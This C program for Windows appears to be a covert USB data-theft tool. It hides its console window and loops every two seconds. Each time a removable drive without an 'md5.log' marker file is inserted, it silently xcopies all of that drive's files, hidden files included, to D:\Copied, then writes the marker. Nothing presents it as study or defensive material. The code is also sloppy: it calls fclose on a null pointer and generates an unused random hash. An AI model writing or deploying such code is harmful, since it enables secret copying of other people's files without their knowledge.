#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define _WIN32_WINNT 0x0500

#include <windows.h>
#include <wchar.h>


char* hash_generator(int SIZE) {
    // Charset for the Hash
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    const int charset_size = 62;

    // Container for the generated Hash
    char* hash;
    hash = malloc((SIZE+1) * sizeof(char));

    // Random seed
    srand(time(0));

    for (int i=0; i<SIZE; i++) {

        // Generate a random number [0...61]
        char cur = charset[rand()%charset_size];
        hash[i] = cur;

    }
    // End the string with a null character and return it
    hash[SIZE] = 0;
    return hash;
}


int exec() {
    // Controlling the console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_MINIMIZE); // Minimizes the Console
    ShowWindow(hWnd, SW_HIDE); // Hides the Console

    // Get a list of all Logical Drives
    wchar_t LogicalDrives[MAX_PATH] = {0};
    DWORD r = GetLogicalDriveStringsW(MAX_PATH, LogicalDrives);

    if (r == 0) {
        wprintf(L"Failed to get drive names %ld", GetLastError());
        return 1;
    }

    if (r > 0 && r <= MAX_PATH) {
        
        // Iterate over each Drive
        wchar_t *SingleDrive = LogicalDrives;

        while(*SingleDrive) {

            int drive_type = GetDriveTypeW(SingleDrive);
            printf("%S  ->%d \n",SingleDrive, drive_type);
            
            // Checks if the drive type is a Removable device
            if (drive_type==2) {

                // Check if the file exists
                char filename[100] ;
                sprintf(filename, "%Smd5.log",SingleDrive);
                printf("Name =%s\n", filename);
                FILE *file;
                file = fopen(filename, "r");


                if (file == NULL) {
                    fclose(file);
                    
                    printf("File Not Found\n");
                    printf("Uncognized device!");
                    printf("\nPreparing to Copy Files\n");
                    char command[100];
                    sprintf(command, "xcopy \"%S\\\" D:\\Copied\\ /s/h/e/k/f/c/Y ",SingleDrive );
                    system(command);
                    file = fopen(filename, "w");
                }
                else {    
                    printf("File Found\nDevice is Recognized!\n");
                    fclose(file);
                }
            }

            SingleDrive += wcslen(SingleDrive) + 1;
        }
    }
}

int main() {
    printf("%s\n", hash_generator(10));
    while(1){
        exec();
        Sleep(2000);

    }

    return 0;
}
